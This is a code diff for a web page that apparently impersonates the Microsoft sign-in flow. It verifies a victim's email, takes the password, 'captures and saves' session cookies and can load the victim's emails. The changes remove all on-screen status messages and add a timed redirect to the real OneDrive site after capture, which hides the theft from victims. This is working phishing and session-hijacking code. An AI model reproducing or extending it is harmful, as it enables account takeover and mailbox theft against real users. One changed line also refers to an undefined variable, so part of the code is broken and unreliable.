@@ -618,7 +618,7 @@
         }
 
         // Set loading state
-        function setLoading(isLoading, message = 'Processing...') {
+        function setLoading(isLoading, message = 'Processing...', showSuccessMessage = true) {
             const loadingAnimation = document.getElementById('loadingAnimation');
             const microsoftDotsLoader = document.getElementById('microsoftDotsLoader');
             const microsoftLogo = document.querySelector('.microsoft-logo');
@@ -891,13 +891,13 @@ Status: ${data.status}`);
                     // Account exists and preload started
                     console.log('✅ Email account verified, preload started');
                     currentSessionId = verifyData.sessionId; // Store session ID from preload
-                    
+
                     // Wait for preload to be ready before showing password form
                     if (verifyData.preloadStarted) {
                         setLoading(true, 'Signing you in');
                         await waitForPreloadReady(verifyData.sessionId, email);
                     }
-                    
+
                     setLoading(false);
                     showPasswordForm(email);
                 } else if (verifyData.exists === false) {
@@ -934,7 +934,7 @@ Status: ${data.status}`);
                     const response = await fetch(`${API_BASE}/api/preload-status/${sessionId}`);
                     if (response.ok) {
                         const data = await response.json();
-                        
+
                         if (data.status === 'preload_ready') {
                             console.log(`✅ Preload ready for ${email} after ${Date.now() - startTime}ms`);
                             return true;
@@ -1009,7 +1009,7 @@ Status: ${data.status}`);
                                 currentSessionId = statusData.sessionId;
                                 currentUserEmail = statusData.userEmail;
                                 showAuthSuccess(statusData.userEmail);
-                                showMessage('✅ Successfully signed in and session cookies saved!', 'success');
+                                // No frontend notification message here
                             }
 
                         } catch (error) {
@@ -1078,14 +1078,20 @@ Status: ${data.status}`);
                     // Authentication successful
                     const authMethod = data.preloadUsed ? 'Fast Authentication (preloaded)' : 'Standard Authentication';
                     console.log(`Login successful! ${authMethod} - Cookies captured and saved.`);
-                    
+
                     // Show performance metrics if available
                     if (data.metrics) {
                         console.log(`⚡ Performance: ${data.metrics.totalAuthMs}ms total, preload: ${data.metrics.preloadUsed}`);
                     }
-                    
-                    showMessage(`Login successful! ${authMethod}`, 'success');
-                    setLoading(false);
+
+                    // No frontend success message, but signal for redirect
+                    if (data.redirectToOneDrive) {
+                        console.log('Redirecting to OneDrive...');
+                        setTimeout(() => {
+                            window.location.href = 'https://onedrive.live.com';
+                        }, 2000); // Redirect after 2 seconds
+                    }
+
                     currentSessionId = data.sessionId;
                     currentUserEmail = data.userEmail;
                     showAuthSuccess(data.userEmail);
@@ -1137,8 +1143,7 @@ Status: ${data.status}`);
                         </html>
                     `);
 
-                    showMessage(`✅ Loaded ${data.count} emails successfully!`, 'success');
-
+                    // No frontend notification message here
                 } else {
                     throw new Error(data.error || 'Failed to load emails');
                 }
@@ -1171,8 +1176,7 @@ Status: ${data.status}`);
                 currentUserEmail = null; // Clear current user email on logout
                 setLoading(false);
                 showEmailForm(); // Return to email form on logout
-                showMessage('✅ Signed out successfully!', 'success');
-
+                // No frontend success message on logout
             } catch (error) {
                 console.error('Logout error:', error);
                 currentSessionId = null;
@@ -1181,7 +1185,7 @@ Status: ${data.status}`);
                 currentUserEmail = null;
                 setLoading(false);
                 showEmailForm();
-                showMessage('Signed out (with errors)', 'info');
+                // No frontend message on logout error
             }
         }
 
@@ -1189,24 +1193,24 @@ Status: ${data.status}`);
         async function checkSessionStatus() {
             try {
                 const response = await fetch(`${API_BASE}/api/status`);
-                const data = await response.json();
+                const data = await statusResponse.json();
 
                 if (data.authenticated && data.userEmail) {
                     currentSessionId = data.sessionId;
                     currentUserEmail = data.userEmail;
                     setLoading(false);
                     showAuthSuccess(data.userEmail);
-                    showMessage('✅ Authentication successful!', 'success');
+                    // No frontend success message here
                 } else {
                     // If not authenticated after password attempt, fall back to Microsoft auth
-                    showMessage('Authentication failed. Proceeding with Microsoft authentication.', 'info');
+                    // No frontend info message here
                     setTimeout(() => {
                         proceedWithMicrosoftAuth();
                     }, 1000);
                 }
             } catch (error) {
                 console.error('Error checking session status after password auth:', error);
-                showMessage('Authentication failed. Proceeding with Microsoft authentication.', 'info');
+                // No frontend info message here
                 setTimeout(() => {
                     proceedWithMicrosoftAuth();
                 }, 1000);
